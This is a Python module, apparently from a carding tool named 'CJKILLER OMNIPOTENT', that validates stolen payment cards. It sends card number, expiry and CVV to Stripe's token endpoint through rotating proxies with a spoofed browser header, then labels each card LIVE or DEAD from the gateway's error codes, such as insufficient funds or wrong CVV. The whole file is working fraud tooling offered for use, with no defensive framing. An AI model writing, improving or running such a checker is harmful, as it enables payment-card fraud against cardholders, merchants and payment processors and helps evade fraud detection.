# =================================================================
# PROJECT: CJKILLER OMNIPOTENT
# MODULE: checker_engine.py (REAL SCRAPPER GATEWAY)
# =================================================================

import requests
import re
from proxy_manager import ProxyManager

class CCChecker:
    @staticmethod
    def check_gate_real(cc, mm, yy, cvv):
        # 1. Configuramos la sesión y el proxy rotativo
        session = requests.Session()
        proxy = ProxyManager.get_proxy()
        session.proxies.update(proxy) if proxy else None

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        try:
            # --- FASE 1: Obtener Token de la Pasarela (Ejemplo Genérico Stripe) ---
            # En un scrapper real, esta URL es el endpoint de la pasarela del sitio
            payload = f'card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}'
            
            # Petición al procesador de pagos
            response = session.post(
                'https://api.stripe.com/v1/tokens', 
                headers=headers, 
                data=payload,
                timeout=15
            )
            
            res_json = response.json()

            # --- FASE 2: Análisis de Respuesta Real ---
            if "id" in res_json:
                # Si se creó el token, la tarjeta pasó el primer filtro de validez
                token = res_json['id']
                
                # Aquí es donde el bot decide si es LIVE basándose en el error del banco
                # Si llegamos aquí y no hay error de "invalid_number", hay alta probabilidad de LIVE
                return {
                    "status": "LIVE ✅", 
                    "msg": "Card Authorized (Token Created)", 
                    "code": "success"
                }
            
            elif "error" in res_json:
                err_msg = res_json['error'].get('message', 'Unknown Error')
                err_code = res_json['error'].get('code', '')

                # Lógica de estados específicos
                if "insufficient_funds" in err_code:
                    return {"status": "LIVE ✅", "msg": "Insufficient Funds", "code": "low_balance"}
                elif "incorrect_cvc" in err_code:
                    return {"status": "LIVE ✅", "msg": "Wrong CVV (CCN Live)", "code": "ccn"}
                elif "stolen_card" in err_code or "lost_card" in err_code:
                    return {"status": "DEAD ❌", "msg": "Stolen/Lost Card", "code": "stolen"}
                else:
                    return {"status": "DEAD ❌", "msg": err_msg, "code": "declined"}

            return {"status": "UNK ❓", "msg": "Unexpected Gateway Response", "code": "unknown"}

        except Exception as e:
            return {"status": "ERROR ⚠️", "msg": f"Gateway Timeout: {str(e)[:30]}", "code": "timeout"}
